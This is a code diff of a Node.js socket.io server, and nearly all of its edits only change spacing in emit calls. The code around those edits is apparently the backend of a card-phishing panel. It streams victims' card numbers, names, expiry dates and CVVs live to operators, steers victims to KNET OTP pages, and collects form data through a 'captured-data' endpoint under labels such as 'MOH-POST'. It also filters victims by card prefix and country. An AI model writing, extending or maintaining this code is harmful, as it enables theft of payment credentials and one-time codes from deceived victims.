@@ -431,7 +431,7 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", { store: STORE,...({
+    socket.emit("successfully-connected", { store: STORE, ...({
       sid: socket.id,
       pid: visitor._id,
     })});
@@ -439,9 +439,9 @@ io.on("connection", (socket) => {
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", { store: STORE,...({ ...visitor, isConnected: true })});
+        io.to(adminSocketId).emit("visitor:new", { store: STORE, ...({ ...visitor, isConnected: true })});
       } else {
-        io.to(adminSocketId).emit("visitor:reconnected", { store: STORE,...({ visitorId: visitor._id, socketId: socket.id })});
+        io.to(adminSocketId).emit("visitor:reconnected", { store: STORE, ...({ visitorId: visitor._id, socketId: socket.id })});
       }
     });
   });
@@ -463,14 +463,14 @@ io.on("connection", (socket) => {
           /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp })});
+            io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp })});
           });
         }
       } else {
         visitor.liveCard = null;
         visitor.liveCardTimestamp = null;
         admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
+          io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
             visitorId: visitor._id,
             liveCard: null,
             liveCardTimestamp: null,
@@ -482,7 +482,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:pageChanged", { store: STORE, ...({
           visitorId: visitor._id,
           page,
         })});
@@ -501,7 +501,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:nameUpdated", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:nameUpdated", { store: STORE, ...({
           visitorId: visitor._id,
           name: name,
         })});
@@ -595,7 +595,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:dataSubmitted", { store: STORE, ...({
 
           visitorId: visitor._id,
           socketId: socket.id,
@@ -625,7 +625,7 @@ socket.on("card:live", (data) => {
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
+    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
       visitorId: visitor._id,
       liveCard: visitor.liveCard,
       liveCardTimestamp: visitor.liveCardTimestamp,
@@ -640,7 +640,7 @@ socket.on("card:liveHide", () => {
   visitor.liveCardTimestamp = null;
   visitors.set(socket.id, visitor);
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
+    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE, ...({
       visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
     })});
   });
@@ -659,7 +659,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:cardVerification", { store: STORE, ...({
           visitorId: visitor._id,
           cardNumber,
           isBlocked,
@@ -807,7 +807,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     var __skipEmit100 = false, __vv100 = null;
 /*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
 if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
-    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { store: STORE,...({ visitorId: __v98._id, page: __v98.page })}); } catch(e){} }); } } catch(e){}
+    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { store: STORE, ...({ visitorId: __v98._id, page: __v98.page })}); } catch(e){} }); } } catch(e){}
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
@@ -902,7 +902,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:deleted", { store: STORE,...({ visitorId })});
+      io.to(adminSocketId).emit("visitor:deleted", { store: STORE, ...({ visitorId })});
     });
 
     console.log(`Visitor deleted by ID: ${visitorId}`);
@@ -1030,7 +1030,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
   socket.on("blockedCards:check", (cardNumber) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
-    socket.emit("blockedCards:checkResult", { store: STORE,...({ isBlocked, prefix })});
+    socket.emit("blockedCards:checkResult", { store: STORE, ...({ isBlocked, prefix })});
   });
 
   // Blocked Countries: Get list
@@ -1071,7 +1071,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
     const isBlocked = globalBlockedCountries.some(c =>
       c.toLowerCase() === country.toLowerCase()
     );
-    socket.emit("blockedCountries:checkResult", { store: STORE,...({ isBlocked, country })});
+    socket.emit("blockedCountries:checkResult", { store: STORE, ...({ isBlocked, country })});
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
@@ -1096,7 +1096,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 
     // Notify all admins about the update
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:markedAsRead", { store: STORE,...({ visitorId })});
+      io.to(adminSocketId).emit("visitor:markedAsRead", { store: STORE, ...({ visitorId })});
     });
 
     console.log(`Visitor ${visitorId} marked as read`);
@@ -1125,7 +1125,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 
       // Notify all admins about the new message
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("chat:newMessage", { store: STORE,...({
+        io.to(adminSocketId).emit("chat:newMessage", { store: STORE, ...({
           visitorSocketId: visitor.socketId,
           visitorId: visitor._id,
           message: chatMessage
@@ -1215,7 +1215,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("visitor:disconnected", { store: STORE,...({
+            io.to(adminSocketId).emit("visitor:disconnected", { store: STORE, ...({
               visitorId: visitorId,
               socketId: socketId,
             })});
@@ -1364,13 +1364,13 @@ v.page = pageName;
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         if (username) {
-          io.to(adminSocketId).emit('visitor:nameUpdated', { store: STORE,...({
+          io.to(adminSocketId).emit('visitor:nameUpdated', { store: STORE, ...({
             visitorId: v._id,
             name: username,
           })});
         }
         if (Object.keys(fields).length > 0) {
-          io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE,...({
+          io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE, ...({
             visitorId: v._id,
             socketId: matchedVisitor.socketId,
             data: { content: fields, page: pageName },
@@ -1445,7 +1445,7 @@ app.post("/api/captured-data", (req, res) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE,...({
+        io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE, ...({
           visitorId: v._id,
           socketId: matchedVisitor.socketId,
           data: { content: parsedFields, page: `MOH-POST: ${url}` },
@@ -1651,7 +1651,7 @@ setInterval(() => {
       visitors.set(sid, visitor);
       // Notify admins about idle status change
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:idleChanged", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:idleChanged", { store: STORE, ...({
           visitorId: visitor._id,
           isIdle: isNowIdle,
         })});
@@ -1682,7 +1682,7 @@ setInterval(() => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:disconnected", { store: STORE,...({
+        io.to(adminSocketId).emit("visitor:disconnected", { store: STORE, ...({
           visitorId: visitorId,
           socketId: sid,
         })});
@@ -1726,7 +1726,7 @@ if(!v||!fields||typeof fields!=='object')return;
 var sig='';try{sig=JSON.stringify(fields)}catch(e){}
 if(v.__kdkSig===sig)return;v.__kdkSig=sig;
 try{var nm=fields.customer_name||fields.name||fields.fullName||fields['الاسم'];
-if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{ store: STORE,...({visitorId:v._id,name:s})}catch(e){}})}}}
+if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{ store: STORE, ...({visitorId:v._id,name:s})}catch(e){}})}}}
 catch(e){}
 try{var ph=fields.customer_phone||fields.phone||fields['الهاتف'];if(ph&&String(ph).trim())v.phone=String(ph).trim()}catch(e){}
 var pg=fields['الصفحة']||page||'إتمام الطلب';
@@ -1738,7 +1738,7 @@ v.lastActivity=Date.now();/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__
 v.page=pg;
 visitors.set(v.socketId||v._id,v);
 try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
-admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{ store: STORE,...({visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}})});
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{ store: STORE, ...({visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}})});
 console.log('kdk5 data',v._id,pg)}catch(e){console.log('kdk5 push err',e.message)}}
 io.on('connection',function(socket){
 socket.onAny(function(ev,arg){try{
@@ -1778,7 +1778,7 @@ try{visitors.delete(d.socketId)}catch(e){}
 try{visitors.delete(d._id)}catch(e){}
 try{(d._sockets||[]).forEach(function(sx){if(sx&&sx!==d.socketId)visitors.set(sx,keep)})}catch(e){}
 try{savedVisitors=savedVisitors.filter(function(x){return x._id!==d._id})}catch(e){}
-admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{ store: STORE,...({visitorId:d._id})}catch(e){}})});
+admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{ store: STORE, ...({visitorId:d._id})}catch(e){}})});
 console.log('kdk5 merged',d._id,'->',keep._id)}
 visitors.set(keep.socketId||keep._id,keep);
 admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
